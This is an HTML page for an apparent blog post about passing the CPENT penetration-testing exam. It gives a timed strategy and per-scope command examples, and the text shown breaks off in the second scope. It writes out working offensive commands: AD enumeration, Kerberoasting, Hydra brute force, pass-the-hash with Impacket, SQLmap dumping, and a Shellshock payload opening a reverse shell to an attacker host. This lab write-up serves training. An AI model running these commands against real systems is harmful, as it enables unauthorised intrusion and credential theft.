@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CPENT | 10-Hour Exam Execution — Nisarg Chasmawala</title>
+<meta name="description" content="How I cracked the CPENT exam in 10 hours and scored 2050/2500 — five-scope tactical breakdown by Nisarg Chasmawala.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Exo+2:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#020b14; --bg2:#06121e; --bg-card:rgba(4,18,32,0.72);
+  --red:#e63946; --red-dim:#b02a35; --red-faint:rgba(230,57,70,0.08);
+  --orange:#ff9f1c; --orange-faint:rgba(255,159,28,0.07);
+  --cyan:#00e5ff; --cyan-dim:#00a0cc; --cyan-faint:rgba(0,229,255,0.07);
+  --border:rgba(230,57,70,0.15); --border-hi:rgba(230,57,70,0.38);
+  --text-hi:#f5e0e0; --text:#8fb8cc; --text-lo:#3d5c6e;
+  --ff-head:'Orbitron',monospace; --ff-body:'Exo 2',sans-serif; --ff-mono:'Share Tech Mono',monospace;
+  --glow-r:0 0 18px rgba(230,57,70,0.45),0 0 45px rgba(230,57,70,0.14);
+  --glow-o:0 0 18px rgba(255,159,28,0.4),0 0 40px rgba(255,159,28,0.14);
+  --glow-c:0 0 18px rgba(0,229,255,0.35),0 0 40px rgba(0,229,255,0.12);
+  --radius:14px;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--ff-body);background:var(--bg);color:var(--text);line-height:1.72;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+strong{color:var(--text-hi);font-weight:600}
+code{font-family:var(--ff-mono);background:rgba(230,57,70,0.09);border:1px solid rgba(230,57,70,0.22);padding:1px 6px;border-radius:4px;font-size:.85em;color:var(--red-dim)}
+*{cursor:none}
+#c-dot{position:fixed;width:7px;height:7px;background:var(--red);border-radius:50%;pointer-events:none;z-index:10001;transform:translate(-50%,-50%);box-shadow:0 0 10px var(--red),0 0 24px rgba(230,57,70,0.55);transition:transform .08s}
+#c-ring{position:fixed;width:34px;height:34px;border:1px solid rgba(230,57,70,0.5);border-radius:50%;pointer-events:none;z-index:10000;transform:translate(-50%,-50%);transition:width .2s,height .2s,border-color .2s,background .2s}
+#c-dot.active{transform:translate(-50%,-50%) scale(1.8)}
+#c-ring.active{width:52px;height:52px;border-color:var(--red);background:rgba(230,57,70,0.04)}
+#scroll-bar{position:fixed;top:0;left:0;height:2px;background:linear-gradient(90deg,var(--red),var(--orange),var(--cyan));z-index:9998;width:0%;transition:width .08s linear;box-shadow:0 0 8px var(--red)}
+#bg-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}
+.scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.025) 2px,rgba(0,0,0,.025) 4px)}
+.grain{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.025;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
+.wrap{position:relative;z-index:3;max-width:1080px;margin:0 auto;padding:0 28px 100px}
+
+/* NAV */
+.top-nav{display:flex;justify-content:space-between;align-items:center;padding:22px 0;border-bottom:1px solid var(--border);margin-bottom:70px;font-family:var(--ff-mono);font-size:.72rem;letter-spacing:.14em;color:var(--text-lo)}
+.nav-classified{color:rgba(230,57,70,.55)}
+.nav-alias{color:var(--cyan);letter-spacing:.32em;font-size:.88rem}
+.nav-certcode{color:var(--orange)}
+
+/* HERO */
+.hero{text-align:center;padding:60px 0 50px;animation:fadeUp .9s ease both}
+.hero-badge{display:inline-flex;align-items:center;gap:10px;background:var(--red-faint);border:1px solid rgba(230,57,70,.22);border-radius:30px;padding:7px 22px;font-family:var(--ff-mono);font-size:.7rem;color:rgba(230,57,70,.8);letter-spacing:.18em;text-transform:uppercase;margin-bottom:36px}
+.hero-badge .blink{width:6px;height:6px;border-radius:50%;background:var(--red);flex-shrink:0;animation:blink 2s infinite}
+@keyframes blink{0%,100%{opacity:1;box-shadow:0 0 8px var(--red)}50%{opacity:.3;box-shadow:none}}
+.hero h1{font-family:var(--ff-head);font-size:clamp(1.75rem,4.2vw,3.1rem);font-weight:900;line-height:1.18;color:var(--text-hi);letter-spacing:.02em;margin-bottom:18px}
+.hero h1 .r{color:var(--red);text-shadow:var(--glow-r)}
+.hero h1 .o{color:var(--orange)}
+.hero h1 .c{color:var(--cyan)}
+.hero-sub{font-family:var(--ff-mono);font-size:clamp(.72rem,1.4vw,.88rem);color:var(--text-lo);letter-spacing:.14em;margin-bottom:50px}
+.hero-stats{display:flex;justify-content:center;gap:52px;flex-wrap:wrap;animation:fadeUp .9s .18s ease both}
+.stat{text-align:center}
+.stat-val{font-family:var(--ff-head);font-size:clamp(2rem,4vw,2.9rem);font-weight:700;line-height:1;margin-bottom:6px}
+.stat-val.r{color:var(--red);text-shadow:var(--glow-r)}
+.stat-val.o{color:var(--orange);text-shadow:var(--glow-o)}
+.stat-val.c{color:var(--cyan);text-shadow:var(--glow-c)}
+.stat-lbl{font-family:var(--ff-mono);font-size:.64rem;color:var(--text-lo);letter-spacing:.2em;text-transform:uppercase}
+
+/* SECTIONS */
+.s-wrap{margin-bottom:88px;opacity:0;transform:translateY(32px);transition:opacity .72s ease,transform .72s ease}
+.s-wrap.in{opacity:1;transform:translateY(0)}
+.s-head{display:flex;align-items:center;gap:14px;margin-bottom:34px}
+.s-num{font-family:var(--ff-mono);font-size:.68rem;color:var(--text-lo);letter-spacing:.18em;min-width:28px}
+.s-title{font-family:var(--ff-head);font-size:clamp(.92rem,2.2vw,1.28rem);font-weight:700;color:var(--text-hi);letter-spacing:.05em;white-space:nowrap}
+.s-title .r{color:var(--red)} .s-title .o{color:var(--orange)} .s-title .c{color:var(--cyan)}
+.s-line{flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent)}
+
+/* PROSE */
+.prose-card{background:var(--bg-card);backdrop-filter:blur(22px) saturate(180%);border:1px solid var(--border);border-radius:var(--radius);padding:38px 40px;position:relative;overflow:hidden}
+.prose-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--red),var(--orange),transparent)}
+.prose-card p{font-size:.96rem;line-height:1.82;margin-bottom:16px;color:var(--text)}
+.prose-card p:last-child{margin-bottom:0}
+
+/* TABLE */
+.tbl-wrap{overflow-x:auto;border-radius:var(--radius);border:1px solid var(--border);background:var(--bg-card);backdrop-filter:blur(22px)}
+.data-tbl{width:100%;border-collapse:collapse;font-size:.91rem}
+.data-tbl th{font-family:var(--ff-mono);font-size:.68rem;letter-spacing:.18em;text-transform:uppercase;color:var(--red);padding:13px 22px;text-align:left;border-bottom:1px solid var(--border);background:var(--red-faint)}
+.data-tbl td{padding:11px 22px;border-bottom:1px solid rgba(230,57,70,.055);color:var(--text);transition:background .2s}
+.data-tbl tr:last-child td{border-bottom:none}
+.data-tbl tr:hover td{background:rgba(230,57,70,.03)}
+.data-tbl td:first-child{font-family:var(--ff-mono);font-size:.76rem;color:var(--text-lo);letter-spacing:.08em}
+.data-tbl td.hi-o{color:var(--orange);font-family:var(--ff-head);font-weight:700;font-size:1.02rem;text-shadow:var(--glow-o)}
+
+/* WEIGHTAGE BARS */
+.weight-grid{display:flex;flex-direction:column;gap:10px}
+.w-row{display:flex;align-items:center;gap:14px}
+.w-label{font-family:var(--ff-mono);font-size:.72rem;color:var(--text-lo);min-width:290px;letter-spacing:.04em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.w-bar-wrap{flex:1;height:8px;background:rgba(255,255,255,.04);border-radius:4px;overflow:hidden;border:1px solid rgba(230,57,70,.1)}
+.w-bar{height:100%;border-radius:4px;transition:width 1.2s cubic-bezier(.22,1,.36,1)}
+.w-pts{font-family:var(--ff-mono);font-size:.66rem;color:var(--orange);min-width:80px;text-align:right}
+
+/* STRATEGY CARDS */
+.cards-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:22px}
+.s-card{background:var(--bg-card);backdrop-filter:blur(22px) saturate(180%);border:1px solid var(--border);border-radius:var(--radius);padding:30px;position:relative;overflow:hidden;transition:border-color .28s,box-shadow .28s;transform-style:preserve-3d;will-change:transform}
+.s-card::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--red),var(--orange),transparent);opacity:0;transition:opacity .28s}
+.s-card:hover::after{opacity:1}
+.s-card:hover{border-color:var(--border-hi);box-shadow:0 0 34px rgba(230,57,70,.1),0 24px 60px rgba(0,0,0,.45)}
+.card-ghost{font-family:var(--ff-head);font-size:4rem;font-weight:900;color:rgba(230,57,70,.04);position:absolute;top:14px;right:18px;line-height:1;user-select:none}
+.card-icon{width:46px;height:46px;background:var(--red-faint);border:1px solid rgba(230,57,70,.22);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.35rem;margin-bottom:18px}
+.card-kicker{font-family:var(--ff-mono);font-size:.65rem;color:var(--red-dim);letter-spacing:.2em;text-transform:uppercase;margin-bottom:7px}
+.card-title{font-family:var(--ff-head);font-size:.94rem;font-weight:700;color:var(--text-hi);margin-bottom:14px;line-height:1.35}
+.card-body{font-size:.87rem;color:var(--text);line-height:1.68;margin-bottom:14px}
+.card-list{list-style:none;margin-bottom:14px}
+.card-list li{font-size:.84rem;color:var(--text);padding:5px 0 5px 20px;position:relative;line-height:1.52}
+.card-list li::before{content:'▹';position:absolute;left:0;color:var(--red);font-size:.78rem;top:7px}
+.saved-tag{display:inline-block;background:rgba(255,159,28,.08);border:1px solid rgba(255,159,28,.22);border-radius:5px;padding:4px 10px;font-family:var(--ff-mono);font-size:.62rem;color:var(--orange);letter-spacing:.1em;margin-top:4px}
+.pro-tip{background:var(--orange-faint);border:1px solid rgba(255,159,28,.2);border-radius:8px;padding:11px 14px;font-size:.81rem;color:rgba(255,159,28,.9);line-height:1.55}
+.pro-tip b{font-family:var(--ff-mono);font-size:.66rem;color:var(--orange);letter-spacing:.14em;font-weight:normal;display:block;margin-bottom:4px}
+
+/* CMD BLOCKS */
+.cmd{background:#010810;border:1px solid rgba(230,57,70,.18);border-left:2px solid var(--red);border-radius:0 7px 7px 0;padding:11px 15px;margin:10px 0;font-family:var(--ff-mono);font-size:.76rem;color:#c8dff0;line-height:1.75;overflow-x:auto}
+.cmd .tl{display:block} .cmd .tl::before{content:'$ ';color:var(--red-dim)}
+.cmd .cm{display:block;color:rgba(61,92,110,.85)} .cmd .cm::before{content:'// '}
+.cmd .ok{display:block;color:rgba(0,229,100,.7)} .cmd .ok::before{content:'✅ '}
+.cmd .fx{display:block;color:rgba(255,159,28,.8)} .cmd .fx::before{content:'🔥 '}
+
+/* SCOPE SECTION */
+.scope-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:20px}
+.scope-card{background:var(--bg-card);backdrop-filter:blur(22px);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;transition:border-color .25s,box-shadow .25s;transform-style:preserve-3d;will-change:transform}
+.scope-card:hover{border-color:var(--border-hi);box-shadow:0 0 28px rgba(230,57,70,.09),0 20px 50px rgba(0,0,0,.4)}
+.scope-header{display:flex;align-items:center;gap:12px;padding:16px 20px;border-bottom:1px solid rgba(230,57,70,.1);background:var(--red-faint)}
+.scope-num{font-family:var(--ff-head);font-size:.72rem;font-weight:700;color:var(--red);min-width:30px}
+.scope-name{font-family:var(--ff-head);font-size:.8rem;font-weight:700;color:var(--text-hi);flex:1;letter-spacing:.03em;line-height:1.25}
+.scope-pts{font-family:var(--ff-mono);font-size:.6rem;color:var(--orange);background:rgba(255,159,28,.08);border:1px solid rgba(255,159,28,.18);padding:3px 8px;border-radius:4px;white-space:nowrap}
+.scope-body{padding:16px 20px}
+.scope-targets{font-family:var(--ff-mono);font-size:.64rem;color:var(--text-lo);letter-spacing:.08em;margin-bottom:12px}
+.scope-targets span{color:var(--red-dim);margin:0 4px}
+.scope-techniques{list-style:none;margin-bottom:14px}
+.scope-techniques li{font-size:.82rem;color:var(--text);padding:4px 0 4px 18px;position:relative;line-height:1.45}
+.scope-techniques li::before{content:'▸';position:absolute;left:0;color:var(--red);font-size:.72rem;top:6px}
+.scope-cmd{background:#010810;border-radius:6px;padding:9px 12px;font-family:var(--ff-mono);font-size:.72rem;color:#aad4f0;line-height:1.7;border:1px solid rgba(230,57,70,.13);overflow-x:auto;margin-bottom:12px}
+.scope-cmd .tl{display:block} .scope-cmd .tl::before{content:'$ ';color:rgba(230,57,70,.6)}
+.scope-cmd .cm{display:block;color:rgba(61,92,110,.8)} .scope-cmd .cm::before{content:'// '}
+.scope-tools{font-family:var(--ff-mono);font-size:.63rem;color:var(--text-lo);letter-spacing:.06em}
+.scope-tools span{color:var(--cyan-dim);background:rgba(0,229,255,.06);border:1px solid rgba(0,229,255,.12);padding:2px 7px;border-radius:4px;margin:0 3px 3px 0;display:inline-block}
+
+/* REMEDIATION TABLE */
+.rem-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px}
+.rem-card{background:var(--bg-card);backdrop-filter:blur(18px);border:1px solid var(--border);border-radius:10px;padding:18px;transition:border-color .2s,background .2s}
+.rem-card:hover{border-color:var(--border-hi);background:rgba(230,57,70,.025)}
+.rem-vuln{font-family:var(--ff-head);font-size:.76rem;font-weight:700;color:var(--text-hi);margin-bottom:6px;letter-spacing:.03em}
+.rem-impact{font-size:.8rem;color:rgba(230,57,70,.8);margin-bottom:8px;line-height:1.45}
+.rem-fix{font-size:.8rem;color:rgba(0,229,255,.7);line-height:1.45}
+.rem-fix::before{content:'Fix: ';font-family:var(--ff-mono);font-size:.65rem;color:var(--cyan-dim);letter-spacing:.1em}
+
+/* MERMAID */
+.mermaid-wrap{background:var(--bg-card);backdrop-filter:blur(22px);border:1px solid var(--border);border-radius:var(--radius);padding:40px 24px;overflow-x:auto}
+.mermaid{display:flex;justify-content:center}
+.mermaid svg{max-width:100%;height:auto}
+
+/* CHECKLIST */
+.check-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px;margin-top:28px}
+.check-item{display:flex;align-items:flex-start;gap:10px;background:var(--red-faint);border:1px solid rgba(230,57,70,.1);border-radius:8px;padding:11px 14px;font-size:.88rem;color:var(--text);transition:border-color .2s,background .2s}
+.check-item:hover{border-color:rgba(230,57,70,.28);background:rgba(230,57,70,.06)}
+.check-item .arr{color:var(--red);flex-shrink:0;font-size:.8rem;margin-top:2px}
+
+/* AUTHOR */
+.author-footer{border-top:1px solid var(--border);padding-top:62px;margin-top:30px}
+.author-inner{display:flex;gap:36px;align-items:flex-start;flex-wrap:wrap}
+.author-av{width:82px;height:82px;border:2px solid var(--cyan);border-radius:14px;background:linear-gradient(135deg,#001a30,#002e50);display:flex;align-items:center;justify-content:center;font-family:var(--ff-head);font-size:1.45rem;font-weight:900;color:var(--cyan);flex-shrink:0;box-shadow:var(--glow-c);position:relative;overflow:hidden;animation:glowPulse 4s infinite ease-in-out}
+.author-av::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,229,255,.1),transparent 55%)}
+@keyframes glowPulse{0%,100%{box-shadow:var(--glow-c)}50%{box-shadow:0 0 30px rgba(0,229,255,.5),0 0 60px rgba(0,229,255,.18)}}
+.author-info{flex:1;min-width:220px}
+.author-name{font-family:var(--ff-head);font-size:1.28rem;font-weight:700;color:var(--text-hi);margin-bottom:3px}
+.author-alias{font-family:var(--ff-mono);font-size:.72rem;color:var(--text-lo);letter-spacing:.2em;margin-bottom:12px}
+.author-alias span{color:var(--cyan)}
+.author-titles{font-size:.8rem;color:var(--cyan-dim);line-height:1.65;margin-bottom:22px;letter-spacing:.015em}
+.author-links{display:flex;flex-wrap:wrap;gap:9px}
+.a-link{display:inline-flex;align-items:center;gap:7px;padding:7px 15px;background:rgba(4,18,32,.85);border:1px solid rgba(0,229,255,.15);border-radius:6px;font-family:var(--ff-mono);font-size:.7rem;color:var(--text-lo);letter-spacing:.06em;transition:all .2s}
+.a-link:hover{border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 14px rgba(0,229,255,.18)}
+.a-link svg{flex-shrink:0}
+.page-foot{text-align:center;padding:48px 0 16px;border-top:1px solid rgba(230,57,70,.05);margin-top:60px;font-family:var(--ff-mono);font-size:.66rem;color:var(--text-lo);letter-spacing:.14em;line-height:2}
+
+@keyframes fadeUp{from{opacity:0;transform:translateY(36px)}to{opacity:1;transform:translateY(0)}}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:rgba(230,57,70,.28);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:rgba(230,57,70,.5)}
+::selection{background:rgba(230,57,70,.18);color:var(--red)}
+
+@media(max-width:640px){
+  .wrap{padding:0 16px 80px}.top-nav{flex-direction:column;gap:6px;text-align:center}
+  .cards-grid,.scope-grid,.rem-grid,.check-grid{grid-template-columns:1fr}
+  .hero-stats{gap:28px}.prose-card{padding:26px 22px}
+  .author-inner{flex-direction:column}.author-av{width:66px;height:66px;font-size:1.1rem}
+  .w-label{min-width:180px}
+}
+</style>
+</head>
+<body>
+<div id="c-dot"></div><div id="c-ring"></div>
+<div id="scroll-bar"></div>
+<canvas id="bg-canvas"></canvas>
+<div class="scanlines"></div><div class="grain"></div>
+
+<div class="wrap">
+
+  <!-- NAV -->
+  <nav class="top-nav">
+    <span class="nav-classified">[ CLASSIFIED // EC-COUNCIL CERTIFIED ]</span>
+    <span class="nav-alias">HEAVEN</span>
+    <span class="nav-certcode">CPENT · ECC6970842153</span>
+  </nav>
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="hero-badge"><span class="blink"></span>Achievement Unlocked · Certified Penetration Testing Professional</div>
+    <h1>How I Cracked the<br><span class="r">CPENT</span> Exam in<br><span class="o">10 Hours</span> — Scoring <span class="c">2050/2500</span></h1>
+    <p class="hero-sub">5-SCOPE TACTICAL BREAKDOWN · AD · BINARY/IoT · WEB · OT/SCADA · NETWORK PIVOTING</p>
+    <div class="hero-stats">
+      <div class="stat"><div class="stat-val r">10H</div><div class="stat-lbl">Completion Time</div></div>
+      <div class="stat"><div class="stat-val o">2050/2500</div><div class="stat-lbl">Final Score (82%)</div></div>
+      <div class="stat"><div class="stat-val c">24H</div><div class="stat-lbl">Allocated Window</div></div>
+      <div class="stat"><div class="stat-val r">5</div><div class="stat-lbl">Attack Scopes</div></div>
+    </div>
+  </section>
+
+  <!-- 01 INTRO -->
+  <div class="s-wrap">
+    <div class="s-head"><span class="s-num">01</span><h2 class="s-title"><span class="r">—</span> Introduction</h2><div class="s-line"></div></div>
+    <div class="prose-card">
+      <p>The <strong>Certified Penetration Testing Professional (CPENT)</strong> by EC-Council is one of the most demanding penetration testing certifications available. Unlike knowledge-based exams, CPENT is a fully practical, hands-on assessment spanning a <strong>24-hour window</strong> (split across two 12-hour sessions) — evaluated across five distinct attack scopes: Active Directory exploitation, binary and IoT exploitation, web application penetration testing, Operational Technology (OT/SCADA) attacks, and multi-hop network pivoting.</p>
+      <p>I completed all five scopes in <strong>10 hours</strong>, achieving a final score of <strong>2050/2500 (82%)</strong>, well above the 70% passing threshold. The decisive factor was <strong>zero improvisation on exam day</strong> — every technique, every tool chain, and every attack pathway had been rehearsed to reflexive execution speed through systematic iLabs preparation. This post documents the complete strategy and scope-by-scope technical breakdown.</p>
+    </div>
+  </div>
+
+  <!-- 02 EXAM STRUCTURE -->
+  <div class="s-wrap">
+    <div class="s-head"><span class="s-num">02</span><h2 class="s-title"><span class="r">—</span> Exam Structure <span class="o">&amp; Scoring</span></h2><div class="s-line"></div></div>
+    <div class="tbl-wrap" style="margin-bottom:28px">
+      <table class="data-tbl">
+        <thead><tr><th>Parameter</th><th>Details</th></tr></thead>
+        <tbody>
+          <tr><td>Certification</td><td>Certified Penetration Testing Professional (CPENT)</td></tr>
+          <tr><td>Issuing Body</td><td>EC-Council</td></tr>
+          <tr><td>Certificate No.</td><td>ECC6970842153</td></tr>
+          <tr><td>Duration</td><td>24 Hours — 2 × 12-Hour Sessions</td></tr>
+          <tr><td>Total Score</td><td>2500 Points</td></tr>
+          <tr><td>Passing Threshold</td><td>1750/2500 (70%)</td></tr>
+          <tr><td>Exam Type</td><td>Practical, Hands-On Lab Assessment</td></tr>
+          <tr><td>My Completion Time</td><td class="hi-o">10 Hours</td></tr>
+          <tr><td>My Score</td><td class="hi-o">2050 / 2500 (82%)</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <!-- Weightage -->
+    <div class="prose-card">
+      <p style="font-family:var(--ff-mono);font-size:.68rem;color:var(--red-dim);letter-spacing:.18em;text-transform:uppercase;margin-bottom:20px">CHALLENGE POINT WEIGHTAGE — PRIORITISATION MAP</p>
+      <div class="weight-grid" id="wg"></div>
+    </div>
+  </div>
+
+  <!-- 03 STRATEGY -->
+  <div class="s-wrap">
+    <div class="s-head"><span class="s-num">03</span><h2 class="s-title"><span class="r">—</span> The 7-Step <span class="o">Speed Strategy</span></h2><div class="s-line"></div></div>
+    <div class="cards-grid">
+
+      <div class="s-card">
+        <span class="card-ghost">01</span>
+        <div class="card-icon">🧪</div>
+        <div class="card-kicker">Step 01 / Foundation</div>
+        <div class="card-title">Master CPENT iLabs Before Exam Day</div>
+        <p class="card-body">The exam is not the place to experiment. Every technique must be reflexive — iLabs provides exact exam-scenario analogues for AD attacks, SMB exploits, pivoting, binary exploitation, and IoT firmware analysis.</p>
+        <ul class="card-list">
+          <li>Active Directory: BloodHound, Kerberoasting, Pass-the-Hash</li>
+          <li>IoT/OT: Firmware analysis, default credential exploitation</li>
+          <li>Pivoting: SSH tunnels, ProxyChains, Plink.exe</li>
+          <li>Binary exploitation: GDB debugging, buffer overflow payloads</li>
+          <li>Web: SQLi, XSS, LFI, WordPress plugin exploits</li>
+        </ul>
+        <span class="saved-tag">~5 hours saved — no on-the-spot troubleshooting</span>
+      </div>
+
+      <div class="s-card">
+        <span class="card-ghost">02</span>
+        <div class="card-icon">🌐</div>
+        <div class="card-kicker">Step 02 / Recon</div>
+        <div class="card-title">Focused Reconnaissance — Aggressive &amp; Parallel</div>
+        <p class="card-body">Generic Nmap scanning wastes hours. A single optimised scan command with <code>--min-rate 1000</code> and <code>-p-</code> across all targets, launched simultaneously at exam start, surfaces all intelligence needed for every scope.</p>
+        <div class="cmd">
+          <span class="tl">nmap -T4 -A -Pn -p- --min-rate 1000 &lt;target-IP&gt;</span>
+          <span class="cm">-p- = all 65535 ports | --min-rate = fast | -Pn = skip ping</span>
+        </div>
+        <span class="saved-tag">~1 hour saved vs generic scanning</span>
+      </div>
+
+      <div class="s-card">
+        <span class="card-ghost">03</span>
+        <div class="card-icon">🎯</div>
+        <div class="card-kicker">Step 03 / Priority</div>
+        <div class="card-title">Attack Highest-Point Targets First</div>
+        <p class="card-body">Point value is not uniform across scopes. AD exploitation (400+ pts) and Pivoting (350+ pts) return far greater score-per-hour than CTF tasks (50–100 pts each). Sequence attacks by return on time investment — not by order of appearance.</p>
+        <ul class="card-list">
+          <li>🟢 Quick wins: network scanning, enumeration tasks</li>
+          <li>🟠 Medium: AD exploitation, web app pentesting</li>
+          <li>🔴 High difficulty, high reward: Pivoting, IoT/OT, binary exploitation</li>
+          <li>⬛ Last: low-value CTF tasks if time buffer remains</li>
+        </ul>
+        <span class="saved-tag">~3 hours saved via point-optimised sequencing</span>
+      </div>
+
+      <div class="s-card">
+        <span class="card-ghost">04</span>
+        <div class="card-icon">⚔️</div>
+        <div class="card-kicker">Step 04 / AD</div>
+        <div class="card-title">BloodHound + CrackMapExec — Automated AD Domination</div>
+        <p class="card-body">Manual AD enumeration of users, groups, and attack paths is a multi-hour exercise. BloodHound maps the entire domain attack graph in minutes. CrackMapExec automates SMB share enumeration and credential validation simultaneously.</p>
+        <div class="cmd">
+          <span class="tl">crackmapexec smb &lt;IP&gt; -u '' -p '' --shares</span>
+          <span class="tl">bloodhound-python -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -c All</span>
+          <span class="tl">GetUserSPNs.py -request -dc-ip &lt;DC&gt; &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;</span>
+        </div>
+        <span class="saved-tag">~2 hours saved — full AD path automation</span>
+      </div>
+
+      <div class="s-card">
+        <span class="card-ghost">05</span>
+        <div class="card-icon">🔀</div>
+        <div class="card-kicker">Step 05 / Pivoting</div>
+        <div class="card-title">Dynamic Port Forwarding — Multi-Hop Pivoting</div>
+        <p class="card-body">Several CPENT targets are unreachable from the initial foothold — they sit behind segmented network layers. SSH tunnelling via Plink creates persistent, reliable pivots through compromised hosts without re-exploitation at each hop.</p>
+        <div class="cmd">
+          <span class="tl">plink.exe -ssh user@target -R 445:local-ip:445</span>
+          <span class="tl">ssh -L 3306:&lt;internal-db&gt;:3306 admin@&lt;pivot-host&gt;</span>
+        </div>
+        <span class="saved-tag">~1.5 hours saved via automated multi-hop pivoting</span>
+      </div>
+
+      <div class="s-card">
+        <span class="card-ghost">06</span>
+        <div class="card-icon">💣</div>
+        <div class="card-kicker">Step 06 / Exploitation</div>
+        <div class="card-title">Automated Brute-Force &amp; Lateral Movement</div>
+        <p class="card-body">Manual credential testing is time-prohibitive at CPENT scale. Hydra with pre-built wordlists handles SSH, RDP, and SMB brute-force in parallel. Impacket's psexec/atexec enables authenticated lateral movement after initial credential capture without re-establishing shells.</p>
+        <div class="cmd">
+          <span class="tl">hydra -L users.txt -P passwords.txt smb://&lt;IP&gt; -t 4</span>
+          <span class="tl">python3 psexec.py '&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;IP&gt;'</span>
+          <span class="tl">python3 atexec.py 'DOMAIN/Administrator:NTLMHASH@&lt;IP&gt;'</span>
+        </div>
+        <span class="saved-tag">~1 hour saved with pre-generated wordlists</span>
+      </div>
+
+      <div class="s-card">
+        <span class="card-ghost">07</span>
+        <div class="card-icon">🕸️</div>
+        <div class="card-kicker">Step 07 / Web</div>
+        <div class="card-title">Automated Web Attack Pipeline</div>
+        <p class="card-body">Manual web testing of every endpoint is a time sink. WPScan identifies vulnerable WordPress plugins in seconds. SQLmap with <code>--batch</code> runs injection and data extraction non-interactively. Shellshock and LFI payloads can be crafted and delivered in under 2 minutes with the right tools pre-staged.</p>
+        <div class="cmd">
+          <span class="tl">wpscan --enumerate vp --url &lt;target-url&gt;</span>
+          <span class="tl">sqlmap -u "&lt;url&gt;?id=1" --dbs --dump --batch</span>
+          <span class="tl">curl -i -H "User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1" &lt;url&gt;</span>
+        </div>
+        <span class="saved-tag">~30 min saved with automated enumeration</span>
+        <div class="pro-tip" style="margin-top:14px"><b>⚡ PRO TIP</b>Pre-stage all exploit scripts and wordlists before the exam. Zero download time during live execution.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- 04 SCOPE BREAKDOWNS -->
+  <div class="s-wrap">
+    <div class="s-head"><span class="s-num">04</span><h2 class="s-title"><span class="r">—</span> Five-Scope <span class="o">Technical Breakdown</span></h2><div class="s-line"></div></div>
+    <div class="scope-grid">
+
+      <!-- SCOPE 1 -->
+      <div class="scope-card">
+        <div class="scope-header">
+          <span class="scope-num">S·01</span>
+          <span class="scope-name">Active Directory Exploitation</span>
+          <span class="scope-pts">400+ PTS</span>
+        </div>
+        <div class="scope-body">
+          <div class="scope-targets">Targets: <span>172.25.170.30</span><span>172.25.170.200</span><span>172.25.170.90</span><span>172.25.170.70</span></div>
+          <ul class="scope-techniques">
+            <li>Nmap confirms DC: ports 53, 88, 139, 389, 445, 3389</li>
+            <li>CrackMapExec enumerates SMB shares — NETLOGON confirms DC</li>
+            <li>Hydra brute-forces RDP &amp; SMB → <code>administrator:Pa$$w0rd123</code></li>
+            <li>RDP access via xfreerdp → GUI access to domain controller</li>
+            <li>SMB Signing disabled on .200 → NTLM relay viable</li>
+            <li>Plink pivot: .30 → .90 via SSH port forward (port 445)</li>
+            <li>Pass-the-Hash via Impacket atexec → SYSTEM on .90</li>
+            <li>RDP to .70 → <code>adminflagBRAVO.txt</code> extracted from Documents</li>
+          </ul>
+          <div class="scope-cmd">
+            <span class="tl">crackmapexec smb 172.25.170.30 -u '' -p '' --shares</span>
+            <span class="tl">hydra -L users.txt -P passwords.txt rdp://172.25.170.30 -t 4</span>
+            <span class="tl">xfreerdp /u:administrator /p:Pa$$w0rd123 /v:172.25.170.30</span>
+            <span class="tl">plink.exe -ssh administrator@172.25.170.30 -R 445:172.25.170.90:445</span>
+            <span class="tl">python3 atexec.py 'DOMAIN/Administrator:NTLMHASH@172.25.170.90'</span>
+          </div>
+          <div class="scope-tools">Tools: <span>CrackMapExec</span><span>BloodHound</span><span>Hydra</span><span>xfreerdp</span><span>Plink</span><span>Impacket</span></div>
+        </div>
+      </div>
+
+      <!-- SCOPE 2 -->
+      <div class="scope-card">
+        <div class="scope-header">
+          <span class="scope-num">S·02</span>
+          <span class="scope-name">Binary Exploitation &amp; IoT</span>
